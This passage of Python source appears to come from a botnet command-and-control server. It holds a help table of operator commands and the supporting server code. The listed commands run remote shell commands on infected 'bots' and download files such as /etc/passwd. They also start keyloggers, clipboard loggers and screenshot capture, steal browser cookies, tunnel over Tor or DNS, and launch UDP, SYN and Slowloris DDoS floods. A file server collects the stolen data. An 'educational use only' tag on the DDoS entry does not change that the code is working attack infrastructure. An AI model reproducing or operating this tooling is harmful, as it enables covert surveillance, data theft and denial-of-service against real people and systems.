            'cmd': {
                'usage': 'cmd <bot_id> <command>',
                'description': 'Execute command on specific bot',
                'examples': [
                    'cmd Bot-123 whoami',
                    'cmd Bot-123 ls -la',
                    'cmd Bot-123 ipconfig'
                ]
            },
            'upload': {
                'usage': 'upload <bot_id> <local_file> [remote_name]',
                'description': 'Upload file to bot',
                'examples': [
                    'upload Bot-123 payload.exe',
                    'upload Bot-123 script.py remote_script.py'
                ]
            },
            'download': {
                'usage': 'download <bot_id> <remote_file> [local_path]',
                'description': 'Download file from bot',
                'examples': [
                    'download Bot-123 document.txt',
                    'download Bot-123 /etc/passwd passwd_file.txt'
                ]
            },
            'list': {
                'usage': 'list',
                'description': 'Show all connected bots',
                'examples': ['list']
            },
            'server': {
                'usage': 'server',
                'description': 'Show server information and status',
                'examples': ['server']
            },
            'security': {
                'usage': 'security',
                'description': 'Show security rules and status',
                'examples': ['security']
            },
            'alerts': {
                'usage': 'alerts',
                'description': 'Show security alerts from bots',
                'examples': ['alerts']
            },
            'processes': {
                'usage': 'processes <bot_id>',
                'description': 'Get process list from bot',
                'examples': ['processes Bot-123']
            },
            'keylogger': {
                'usage': 'keylogger <start|stop> <bot_id>',
                'description': 'Start or stop keylogger on bot',
                'examples': [
                    'keylogger start Bot-123',
                    'keylogger stop Bot-123'
                ]
            },
            'clipboard': {
                'usage': 'clipboard <start|stop> <bot_id>',
                'description': 'Start or stop clipboard monitoring on bot',
                'examples': [
                    'clipboard start Bot-123',
                    'clipboard stop Bot-123'
                ]
            },
            'tor': {
                'usage': 'tor <enable|disable|renew|status>',
                'description': 'Manage Tor service',
                'examples': [
                    'tor enable',
                    'tor disable',
                    'tor renew',
                    'tor status'
                ]
            },
            'dns_tunnel': {
                'usage': 'dns_tunnel <enable|disable|status> [domain]',
                'description': 'Manage DNS Tunneling service',
                'examples': [
                    'dns_tunnel enable c2domain.com',
                    'dns_tunnel disable',
                    'dns_tunnel status'
                ]
            },
            'web': {
                'usage': 'web <start|stop|status>',
                'description': 'Manage web dashboard',
                'examples': [
                    'web start',
                    'web stop', 
                    'web status'
                ]
            },
            'show': {
                'usage': 'show <exploits|stats|logs|config|history|files|network>',
                'description': 'Show various system information',
                'examples': [
                    'show stats',
                    'show logs',
                    'show config'
                ]
            },
            'broadcast': {
                'usage': 'broadcast <command>',
                'description': 'Send command to all connected bots',
                'examples': ['broadcast whoami']
            },
            'clear': {
                'usage': 'clear',
                'description': 'Clear the terminal screen',
                'examples': ['clear']
            },
            'exit': {
                'usage': 'exit',
                'description': 'Exit the C2 server',
                'examples': ['exit']
            },
            'help': {
                'usage': 'help',
                'description': 'Show all available commands',
                'examples': ['help']
            },
            'network_map': {
                'usage': 'network_map <start|status|stop> <bot_id> [scope]',
                'description': 'Manage network mapping on bots',
                'examples': [
                    'network_map start Bot-123',
                    'network_map start Bot-123 local',
                    'network_map status Bot-123',
                    'network_map stop Bot-123'
                ]
            },
            'keylogger': {
                'usage': 'keylogger <start|stop> <bot_id>',
                'description': 'Start or stop keylogger on bot',
                'examples': [
                    'keylogger start Bot-123',
                    'keylogger stop Bot-123'
                ]
            },
            'clipboard': {
                'usage': 'clipboard <start|stop> <bot_id>',
                'description': 'Start or stop clipboard monitoring on bot',
                'examples': [
                    'clipboard start Bot-123',
                    'clipboard stop Bot-123'
                ]
            },
            'cookies': {
                'usage': 'cookies <bot_id>',
                'description': 'Steal browser cookies from bot',
                'examples': ['cookies Bot-123']
            },
            'copy': {
                'usage': 'copy <start|stop> <bot_id>',
                'description': 'Start or stop clipboard logger on bot',
                'examples': [
                    'copy start Bot-123',
                    'copy stop Bot-123'
                ]
            },
            'screenshot': {
                'usage': 'screenshot <bot_id>',
                'description': 'Take screenshot from bot',
                'examples': ['screenshot Bot-123']
            },
            'ss': {
                'usage': 'ss <start|stop> <bot_id>',
                'description': 'Start or stop automatic screenshot capture (every 10 seconds)',
                'examples': [
                    'ss start Bot-123',
                    'ss stop Bot-123'
                ]
            },
            'ddos': {
                'usage': 'ddos <start|syn|slowloris|stop> <bot_id> <target_ip> [--duration <seconds>] [--threads <count>]',
                'description': '⚠️  DDoS attack management (EDUCATIONAL USE ONLY)',
                'details': [
                    '• Attack Types:',
                    '  - UDP/HTTP Flood: ddos start <bot> <target>',
                    '  - SYN Flood (L3): ddos syn <bot> <target> [--threads 100]',
                    '  - Slowloris (L7): ddos slowloris <bot> <target> [--connections 100]',
                    '• Default duration: 30 seconds (max: 300)',
                    '• Default threads: 50 (max: 100 for flood, 200 for SYN)',
                    '• WARNING: Use only on your own systems!',
                    '• Malicious use is strictly prohibited'
                ],
                'examples': [
                    'ddos start Bot-123 192.168.1.100',
                    'ddos syn Bot-123 192.168.1.100 --threads 100',
                    'ddos slowloris Bot-123 192.168.1.100 --connections 200',
                    'ddos start Bot-123 192.168.1.100 --duration 60 --threads 25',
                    'ddos stop Bot-123'
                ]
            },
            'sysinfo': {
                'usage': 'sysinfo <bot_id>',
                'description': 'Get system information from bot',
                'examples': ['sysinfo Bot-123']
            },
            'isvm': {
                'usage': 'isvm <bot_id>',
                'description': 'Check if bot is running in virtual machine',
                'examples': ['isvm Bot-123']
            },
            'whoami': {
                'usage': 'whoami <bot_id>',
                'description': 'Get current user from bot',
                'examples': ['whoami Bot-123']
            },
            'pwd': {
                'usage': 'pwd <bot_id>',
                'description': 'Get current directory from bot',
                'examples': ['pwd Bot-123']
            },
            'ls': {
                'usage': 'ls <bot_id> [path]',
                'description': 'List directory contents on bot',
                'examples': [
                    'ls Bot-123',
                    'ls Bot-123 /home'
                ]
            }
        }
        
        if cmd in help_info:
            info = help_info[cmd]
            print(f"\n\033[95m📖 Help for '{cmd}' command:\033[0m")
            print(f"  \033[96m•\033[0m \033[93mUsage:\033[0m {info['usage']}")
            print(f"  \033[96m•\033[0m \033[93mDescription:\033[0m {info['description']}")
            print(f"  \033[96m•\033[0m \033[93mExamples:\033[0m")
            for example in info['examples']:
                print(f"    \033[92m{example}\033[0m")
            print()
        else:
            print(f"\033[91m[!] No help available for command: {cmd}\033[0m")
            print(f"\033[94m[*] Type 'help' to see all available commands\033[0m")
    
    def _show_stats(self):
        """Show system statistics"""
        try:
            print("\n\033[95m📊 System Statistics:\033[0m")
            print("=" * 60)
            
            # Bot statistics
            with self.lock:
                total_bots = len(self.bots)
                tor_bots = len([bot for bot in self.bots.values() if bot.get('tor_enabled', False)])
                clearnet_bots = total_bots - tor_bots
                
                # Platform statistics
                platforms = {}
                for bot in self.bots.values():
                    platform = bot.get('platform', 'Unknown')
                    platforms[platform] = platforms.get(platform, 0) + 1
            
            print(f"  \033[96m•\033[0m Total Bots: \033[93m{total_bots}\033[0m")
            print(f"  \033[96m•\033[0m Tor Bots: \033[94m{tor_bots}\033[0m")
            print(f"  \033[96m•\033[0m Clearnet Bots: \033[92m{clearnet_bots}\033[0m")
            
            if platforms:
                print(f"  \033[96m•\033[0m Platform Distribution:")
                for platform, count in platforms.items():
                    print(f"     - {platform}: {count}")
            
            # P2P statistics
            active_p2p = len([s for s in self.p2p_status.values() if s['status'] == 'active'])
            print(f"  \033[96m•\033[0m Active P2P Networks: \033[95m{active_p2p}\033[0m")
            
            # Security statistics
            security_alerts = len(self.wireshark_alerts)
            print(f"  \033[96m•\033[0m Security Alerts: \033[91m{security_alerts}\033[0m")
            
            # Network maps statistics
            network_maps_count = len(self.network_maps)
            print(f"  \033[96m•\033[0m Network Maps: \033[96m{network_maps_count}\033[0m")
            
            # Command queue statistics
            queue_size = self.command_queue.qsize()
            print(f"  \033[96m•\033[0m Pending Commands: \033[93m{queue_size}\033[0m")
            
            # Uptime calculation
            import time
            uptime_seconds = int(time.time() - getattr(self, '_start_time', time.time()))
            uptime_hours = uptime_seconds // 3600
            uptime_minutes = (uptime_seconds % 3600) // 60
            uptime_secs = uptime_seconds % 60
            print(f"  \033[96m•\033[0m Server Uptime: \033[94m{uptime_hours}h {uptime_minutes}m {uptime_secs}s\033[0m")
            
        except Exception as e:
            print(f"\033[91m[!] Error showing stats: {str(e)}\033[0m")
    
    def _show_logs(self):
        """Show system logs"""
        try:
            print("\n\033[95m📋 System Logs:\033[0m")
            print("=" * 60)
            
            # Check log files
            log_files = [
                'download_log.json',
                'clipboard_data/',
                'cookies/',
                'network_maps/',
                'bot_files/'
            ]
            
            for log_file in log_files:
                if os.path.exists(log_file):
                    if os.path.isfile(log_file):
                        size = os.path.getsize(log_file)
                        print(f"  \033[96m•\033[0m {log_file}: \033[93m{size:,} bytes\033[0m")
                    else:
                        file_count = len([f for f in os.listdir(log_file) if os.path.isfile(os.path.join(log_file, f))])
                        print(f"  \033[96m•\033[0m {log_file}: \033[93m{file_count} files\033[0m")
                else:
                    print(f"  \033[96m•\033[0m {log_file}: \033[91mNot found\033[0m")
            
            # Recent activities
            print(f"\n\033[95m📊 Recent Activity:\033[0m")
            with self.lock:
                if self.bots:
                    recent_bots = sorted(self.bots.items(), key=lambda x: x[1]['last_seen'], reverse=True)[:5]
                    for bot_id, bot_info in recent_bots:
                        last_seen = time.ctime(bot_info['last_seen'])
                        print(f"  \033[96m•\033[0m {bot_id}: \033[90m{last_seen}\033[0m")
                else:
                    print("  \033[93m[!] No recent activity\033[0m")
            
        except Exception as e:
            print(f"\033[91m[!] Error showing logs: {str(e)}\033[0m")
    
    def _show_config(self):
        """Show server configuration"""
        try:
            print("\n\033[95m⚙️ Server Configuration:\033[0m")
            print("=" * 60)
            
            print(f"  \033[96m•\033[0m Host: \033[93m{self.host}\033[0m")
            print(f"  \033[96m•\033[0m Port: \033[93m{self.port}\033[0m")
            print(f"  \033[96m•\033[0m Encryption: \033[93mAES-256-GCM\033[0m")
            print(f"  \033[96m•\033[0m IPv6 Support: \033[93m{'Enabled' if self.ipv6_enabled else 'Disabled'}\033[0m")
            print(f"  \033[96m•\033[0m Security Rules: \033[93m{'Enabled' if self.security_rules_enabled else 'Disabled'}\033[0m")
            print(f"  \033[96m•\033[0m P2P Port Range: \033[93m{self.p2p_port_range}\033[0m")
            
            # Tor configuration
            print(f"\n\033[95m🔒 Tor Configuration:\033[0m")
            print(f"  \033[96m•\033[0m Tor Enabled: \033[93m{'Yes' if self.tor_enabled else 'No'}\033[0m")
            print(f"  \033[96m•\033[0m Tor Port: \033[93m{self.tor_port}\033[0m")
            print(f"  \033[96m•\033[0m Tor Process: \033[93m{'Running' if self.tor_process else 'Stopped'}\033[0m")
            
            # Web dashboard configuration
            print(f"\n\033[95m🌐 Web Dashboard Configuration:\033[0m")
            print(f"  \033[96m•\033[0m Web Dashboard: \033[93m{'Enabled' if self.web_dashboard_enabled else 'Disabled'}\033[0m")
            print(f"  \033[96m•\033[0m Web Host: \033[93m{self.web_dashboard_host}\033[0m")
            print(f"  \033[96m•\033[0m Web Port: \033[93m{self.web_dashboard_port}\033[0m")
            
            # Network mapping configuration
            print(f"\n\033[95m🗺️ Network Mapping Configuration:\033[0m")
            print(f"  \033[96m•\033[0m Network Maps: \033[93m{'Enabled' if self.network_maps_enabled else 'Disabled'}\033[0m")
            print(f"  \033[96m•\033[0m Maps Directory: \033[93m{self.network_maps_dir}\033[0m")
            print(f"  \033[96m•\033[0m Total Maps: \033[93m{len(self.network_maps)}\033[0m")
            
            # Vulnerability scanner configuration
            print(f"\n\033[95m🔍 Vulnerability Scanner Configuration:\033[0m")
            print(f"  \033[96m•\033[0m Scanner: \033[93m{'Enabled' if self.vuln_scanner_enabled else 'Disabled'}\033[0m")
            print(f"  \033[96m•\033[0m Sources: \033[93mNVD, ExploitDB, CVE Details, SecurityFocus, PacketStorm\033[0m")
            
        except Exception as e:
            print(f"\033[91m[!] Error showing config: {str(e)}\033[0m")
    
    def _show_history(self):
        """Show command history"""
        try:
            print("\n\033[95m📜 Command History:\033[0m")
            print("=" * 60)
            
            if self.command_history:
                print(f"  \033[96m•\033[0m Total Commands: \033[93m{len(self.command_history)}\033[0m")
                print(f"  \033[96m•\033[0m Max History: \033[93m{self.max_history}\033[0m")
                print(f"  \033[96m•\033[0m History File: \033[93m{self.history_file}\033[0m")
                
                print(f"\n\033[95m📋 Recent Commands (Last 10):\033[0m")
                recent_commands = self.command_history[-10:] if len(self.command_history) > 10 else self.command_history
                for i, cmd in enumerate(recent_commands, 1):
                    print(f"  \033[96m{i:2d}.\033[0m {cmd}")
                
                if len(self.command_history) > 10:
                    print(f"  \033[90m... and {len(self.command_history) - 10} more commands\033[0m")
                
                # Find most used commands
                from collections import Counter
                command_counts = Counter(self.command_history)
                most_common = command_counts.most_common(5)
                
                print(f"\n\033[95m📊 Most Used Commands:\033[0m")
                for cmd, count in most_common:
                    print(f"  \033[96m•\033[0m {cmd}: \033[93m{count} times\033[0m")
                
            else:
                print("  \033[93m[!] No command history available\033[0m")
            
            print(f"\n\033[95m💡 Usage:\033[0m")
            print(f"  \033[96m•\033[0m Use ↑/↓ arrow keys to navigate history")
            print(f"  \033[96m•\033[0m Use Tab for command completion")
            print(f"  \033[96m•\033[0m History is saved to {self.history_file}")
            print(f"  \033[96m•\033[0m History persists across server restarts")
            
        except Exception as e:
            print(f"\033[91m[!] Error showing history: {str(e)}\033[0m")
    
    def _show_files(self):
        """Show file system information"""
        try:
            print("\n\033[95m📁 File System Information:\033[0m")
            print("=" * 60)
            
            # Main directories
            directories = [
                'bot_files',
                'clipboard_data',
                'cookies',
                'network_maps',
                'downloads'
            ]
            
            for directory in directories:
                if os.path.exists(directory):
                    file_count = len([f for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f))])
                    dir_count = len([d for d in os.listdir(directory) if os.path.isdir(os.path.join(directory, d))])
                    print(f"  \033[96m•\033[0m {directory}/: \033[93m{file_count} files, {dir_count} directories\033[0m")
                else:
                    print(f"  \033[96m•\033[0m {directory}/: \033[91mNot found\033[0m")
            
            # Log files
            print(f"\n\033[95m📋 Log Files:\033[0m")
            log_files = ['download_log.json']
            for log_file in log_files:
                if os.path.exists(log_file):
                    size = os.path.getsize(log_file)
                    print(f"  \033[96m•\033[0m {log_file}: \033[93m{size:,} bytes\033[0m")
                else:
                    print(f"  \033[96m•\033[0m {log_file}: \033[91mNot found\033[0m")
            
            # Disk usage
            print(f"\n\033[95m💾 Disk Usage:\033[0m")
            try:
                import shutil
                total, used, free = shutil.disk_usage('.')
                print(f"  \033[96m•\033[0m Total Space: \033[93m{total // (1024**3):,} GB\033[0m")
                print(f"  \033[96m•\033[0m Used Space: \033[93m{used // (1024**3):,} GB\033[0m")
                print(f"  \033[96m•\033[0m Free Space: \033[93m{free // (1024**3):,} GB\033[0m")
                print(f"  \033[96m•\033[0m Usage: \033[93m{(used/total)*100:.1f}%\033[0m")
            except Exception as e:
                print(f"  \033[91m[!] Error getting disk usage: {str(e)}\033[0m")
            
        except Exception as e:
            print(f"\033[91m[!] Error showing files: {str(e)}\033[0m")
    
    def _show_network(self):
        """Show network information"""
        try:
            print("\n\033[95m🌐 Network Information:\033[0m")
            print("=" * 60)
            
            # Server network information
            print(f"  \033[96m•\033[0m Server Host: \033[93m{self.host}\033[0m")
            print(f"  \033[96m•\033[0m Server Port: \033[93m{self.port}\033[0m")
            print(f"  \033[96m•\033[0m IPv6 Support: \033[93m{'Enabled' if self.ipv6_enabled else 'Disabled'}\033[0m")
            
            # P2P network information
            print(f"\n\033[95m🔗 P2P Network:\033[0m")
            print(f"  \033[96m•\033[0m P2P Port Range: \033[93m{self.p2p_port_range}\033[0m")
            print(f"  \033[96m•\033[0m Active P2P Networks: \033[93m{len([s for s in self.p2p_status.values() if s['status'] == 'active'])}\033[0m")
            
            # Tor network information
            print(f"\n\033[95m🔒 Tor Network:\033[0m")
            print(f"  \033[96m•\033[0m Tor Enabled: \033[93m{'Yes' if self.tor_enabled else 'No'}\033[0m")
            print(f"  \033[96m•\033[0m Tor Port: \033[93m{self.tor_port}\033[0m")
            print(f"  \033[96m•\033[0m Tor Bots: \033[93m{len([bot for bot in self.bots.values() if bot.get('tor_enabled', False)])}\033[0m")
            
            # Network maps information
            print(f"\n\033[95m🗺️ Network Maps:\033[0m")
            print(f"  \033[96m•\033[0m Total Maps: \033[93m{len(self.network_maps)}\033[0m")
            print(f"  \033[96m•\033[0m Maps Directory: \033[93m{self.network_maps_dir}\033[0m")
            
            # Bot network information
            with self.lock:
                if self.bots:
                    print(f"\n\033[95m🤖 Bot Network:\033[0m")
                    print(f"  \033[96m•\033[0m Total Bots: \033[93m{len(self.bots)}\033[0m")
                    print(f"  \033[96m•\033[0m Tor Bots: \033[94m{len([bot for bot in self.bots.values() if bot.get('tor_enabled', False)])}\033[0m")
                    print(f"  \033[96m•\033[0m Clearnet Bots: \033[92m{len([bot for bot in self.bots.values() if not bot.get('tor_enabled', False)])}\033[0m")
                    
                    # Bot IPs
                    print(f"  \033[96m•\033[0m Bot IPs:")
                    for bot_id, bot_info in list(self.bots.items())[:5]:  # First 5 bots
                        ip = bot_info.get('ip', 'Unknown')
                        tor_status = " (Tor)" if bot_info.get('tor_enabled', False) else ""
                        print(f"     - {bot_id}: {ip}{tor_status}")
                    
                    if len(self.bots) > 5:
                        print(f"     ... and {len(self.bots) - 5} more bots")
                else:
                    print(f"\n\033[95m🤖 Bot Network:\033[0m")
                    print(f"  \033[93m[!] No bots connected\033[0m")
            
        except Exception as e:
            print(f"\033[91m[!] Error showing network: {str(e)}\033[0m")
    
    def _process_network_map(self, bot_id, network_data, map_format, scope, timestamp):
        """Process and save network map data"""
        try:
            # Create safe filename
            safe_scope = scope.replace('/', '_').replace('\\', '_').replace(':', '_')
            safe_timestamp = datetime.fromtimestamp(timestamp).strftime('%Y%m%d_%H%M%S')
            filename = f"map_{safe_scope}_{safe_timestamp}"
            
            # Create directory for bot
            bot_dir = os.path.join(self.network_maps_dir, bot_id)
            os.makedirs(bot_dir, exist_ok=True)
            
            # Save JSON data
            json_file = os.path.join(bot_dir, f"{filename}.json")
            with open(json_file, 'w', encoding='utf-8') as f:
                json.dump(network_data, f, indent=2, ensure_ascii=False)
            
            # Create Mermaid diagram
            mermaid_content = self._create_mermaid_diagram(network_data)
            mermaid_file = os.path.join(bot_dir, f"{filename}.mmd")
            with open(mermaid_file, 'w', encoding='utf-8') as f:
                f.write(mermaid_content)
            
            # Create Markdown report
            markdown_content = self._create_markdown_report(network_data, scope, timestamp)
            markdown_file = os.path.join(bot_dir, f"{filename}.md")
            with open(markdown_file, 'w', encoding='utf-8') as f:
                f.write(markdown_content)
            
            # Save network map data
            with self.lock:
                self.network_maps[bot_id] = {
                    'scope': scope,
                    'timestamp': timestamp,
                    'nodes_count': len(network_data.get('nodes', [])),
                    'links_count': len(network_data.get('links', [])),
                    'files': {
                        'json': json_file,
                        'mermaid': mermaid_file,
                        'markdown': markdown_file
                    }
                }
            
            print(f"\033[92m[+] Network map saved: {bot_id} - {scope}")
            print(f"\033[94m[*] Files: {bot_dir}\033[0m")
            
        except Exception as e:
            print(f"\033[91m[!] Network map processing error: {str(e)}\033[0m")
    
    def _create_mermaid_diagram(self, network_data):
        """Create Mermaid diagram from network data"""
        nodes = network_data.get('nodes', [])
        links = network_data.get('links', [])
        
        mermaid_lines = ["graph TD"]
        
        # Add nodes
        for node in nodes:
            node_id = node.get('id', 'unknown')
            ip = node.get('ip', 'N/A')
            hostname = node.get('hostname', 'N/A')
            mac = node.get('mac', 'N/A')
            os_guess = node.get('os_guess', 'Unknown')
            role = node.get('role', 'unknown')
            
            # Create node label
            label = f"{ip}<br/>{hostname}<br/>MAC: {mac}<br/>OS: {os_guess}<br/>Role: {role}"
            
            mermaid_lines.append(f"    {node_id}[\"{label}\"]")
        
        # Add links
        for link in links:
            source = link.get('source', '')
            target = link.get('target', '')
            protocol = link.get('protocol', 'ip')
            rtt = link.get('rtt_ms', '')
            
            if rtt:
                mermaid_lines.append(f"    {source} -->|{protocol} ({rtt}ms)| {target}")
            else:
                mermaid_lines.append(f"    {source} -->|{protocol}| {target}")
        
        return "\n".join(mermaid_lines)
    
    def _create_markdown_report(self, network_data, scope, timestamp):
        """Create Markdown report from network data"""
        nodes = network_data.get('nodes', [])
        links = network_data.get('links', [])
        
        report = f"""# Network Map Report

## General Information
- **Scope**: {scope}
- **Date**: {datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')}
- **Total Devices**: {len(nodes)}
- **Total Connections**: {len(links)}

## Device List

| IP | Hostname | MAC | OS | Role | Services |
|---|---|---|---|---|---|
"""
        
        for node in nodes:
            ip = node.get('ip', 'N/A')
            hostname = node.get('hostname', 'N/A')
            mac = node.get('mac', 'N/A')
            os_guess = node.get('os_guess', 'Unknown')
            role = node.get('role', 'unknown')
            services = node.get('services', [])
            
            services_str = ", ".join([f"{s.get('port', '')}/{s.get('proto', '')}" for s in services])
            
            report += f"| {ip} | {hostname} | {mac} | {os_guess} | {role} | {services_str} |\n"
        
        report += "\n## Connections\n\n"
        
        for link in links:
            source = link.get('source', 'source')
            target = link.get('target', 'target')
            protocol = link.get('protocol', 'ip')
            rtt = link.get('rtt_ms', 'N/A')
            
            report += f"- **{source}** → **{target}** ({protocol}, {rtt}ms)\n"
        
        return report
    
    def get_network_maps_status(self):
        """Return network maps status"""
        return {
            'enabled': self.network_maps_enabled,
            'total_maps': len(self.network_maps),
            'maps': self.network_maps
        }

class FileServerHandler(BaseHTTPRequestHandler):
    def __init__(self, c2_server, *args, **kwargs):
        self.c2_server = c2_server
        super().__init__(*args, **kwargs)
    
    def do_GET(self):
        try:
            # Parse URL and query parameters
            parsed_path = urlparse(self.path)
            params = parse_qs(parsed_path.query)
            
            # Check authentication
            bot_id = params.get('bot_id', [''])[0]
            token = params.get('token', [''])[0]
            
            if not self.authenticate(bot_id, token):
                self.send_error(401, 'Unauthorized')
                return
            
            # Handle file download
            if parsed_path.path == '/download':
                filename = params.get('file', [''])[0]
                if not filename:
                    self.send_error(400, 'Missing file parameter')
                    return
                
                filepath = os.path.join('bot_files', bot_id, filename)
                if not os.path.exists(filepath):
                    self.send_error(404, 'File not found')
                    return
                
                self.send_response(200)
                self.send_header('Content-type', 'application/octet-stream')
                self.send_header('Content-Disposition', f'attachment; filename="{filename}"')
                self.end_headers()
                
                with open(filepath, 'rb') as f:
                    self.wfile.write(f.read())
                
            # Handle file list
            elif parsed_path.path == '/list':
                bot_dir = os.path.join('bot_files', bot_id)
                if not os.path.exists(bot_dir):
                    os.makedirs(bot_dir, exist_ok=True)
                
                files = [f for f in os.listdir(bot_dir) if os.path.isfile(os.path.join(bot_dir, f))]
                
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({'status': 'success', 'files': files}).encode())
                
            else:
                self.send_error(404, 'Not Found')
                
        except Exception as e:
            self.send_error(500, f'Server error: {str(e)}')
    
    def authenticate(self, bot_id, token):
        if not bot_id or not token:
            return False
            
        if bot_id not in self.c2_server.file_server_tokens:
            return False
            
        token_info = self.c2_server.file_server_tokens[bot_id]
        if token_info['token'] != token or time.time() > token_info['expiry']:
            return False
            
        return True

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle requests in a separate thread."""
    daemon_threads = True

def start_file_server(c2_server, host='0.0.0.0', port=8000):
    """Start the file server in a separate thread."""
    def run_server():
        server_address = (host, port)
        httpd = ThreadedHTTPServer(server_address, lambda *args: FileServerHandler(c2_server, *args))
        c2_server.file_server = httpd
        print(f"[+] File server started on http://{host}:{port}")
        httpd.serve_forever()
    
    thread = threading.Thread(target=run_server, daemon=True)
    thread.start()
    return thread

# Add file server commands to C2Server
C2Server.commands.update({
    'fileserver': 'Start/stop file server',
    'token': 'Generate file access token',
    'upload': 'Upload file to bot',
    'download': 'Download file from bot'
})

if __name__ == '__main__':
    server = C2Server()
    server.start()
